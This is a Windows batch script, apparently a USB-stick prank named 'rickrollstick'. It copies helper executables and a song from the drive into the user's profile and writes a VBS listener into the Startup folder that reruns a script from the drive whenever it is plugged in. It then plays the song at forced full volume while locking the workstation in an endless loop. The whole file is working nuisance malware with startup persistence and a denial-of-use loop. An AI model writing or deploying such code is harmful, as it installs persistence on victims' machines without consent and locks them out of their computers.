@echo off

:main
if not exist "%userprofile%\rickrollstick" goto install
if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rickrollsticklistener.vbs" goto install
if not exist "%userprofile%\rickrollstick\song.mp3" goto install
set /p maindrive=<"%userprofile%"\rickrollstick\maindrive.sys

rem start %maindrive%roll\cmdmp3.exe %maindrive%roll\song.mp3
rem %maindrive%roll\nircmd.exe mutesysvolume 0
rem %maindrive%roll\nircmd.exe setsysvolume 6553
start %userprofile%\rickrollstick\cmdmp3.exe %userprofile%\rickrollstick\song.mp3
%userprofile%\rickrollstick\nircmd.exe setsysvolume 65535
%userprofile%\rickrollstick\nircmd.exe mutesysvolume 0

:a
rundll32.exe user32.dll, LockWorkStation
rem %maindrive%roll\nircmd.exe setsysvolume 6553
rem %maindrive%roll\nircmd.exe setsysvolume 6553
%userprofile%\rickrollstick\nircmd.exe setsysvolume 65535
%userprofile%\rickrollstick\nircmd.exe mutesysvolume 0
goto a




:install
if exist %userprofile%\rickrollstick del %userprofile%\rickrollstick /q /f
if not exist %userprofile%\rickrollstick md %userprofile%\rickrollstick
echo %CD:~0,3%>%userprofile%\rickrollstick\maindrive.sys
set maindrive=%CD:~0,3%

set script="%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rickrollsticklistener.vbs"

echo Set fso = CreateObject("Scripting.FileSystemObject") > %script%
echo Set shell = CreateObject("WScript.Shell") >> %script%
echo userProfilePath = shell.ExpandEnvironmentStrings("%USERPROFILE%") >> %script%
echo driveFilePath = userProfilePath ^& "\rickrollstick\maindrive.sys" >> %script%
echo Do While True >> %script%
echo     If fso.FileExists(driveFilePath) Then >> %script%
echo         Set driveFile = fso.OpenTextFile(driveFilePath, 1) >> %script%
echo         driveLetter = driveFile.ReadLine >> %script%
echo         driveFile.Close >> %script%
echo         filePath = driveLetter ^& "files\rickrollstick_LITE.bat" >> %script%
echo         If fso.FileExists(filePath) Then >> %script%
echo             shell.Run filePath >> %script%
echo             Do While fso.DriveExists(driveLetter) >> %script%
echo                 WScript.Sleep 1000 ' Sleep for 1 second before checking again >> %script%
echo             Loop >> %script%
echo             WScript.Sleep 5000 ' Sleep for 5 seconds before starting search again >> %script%
echo         End If >> %script%
echo     End If >> %script%
echo     WScript.Sleep 1000 ' Sleep for 1 second before checking again >> %script%
echo Loop >> %script%

copy %maindrive%files\nircmd.exe %userprofile%\rickrollstick\nircmd.exe
copy %maindrive%files\cmdmp3.exe %userprofile%\rickrollstick\cmdmp3.exe
copy %maindrive%files\song.mp3 %userprofile%\rickrollstick\song.mp3
goto main
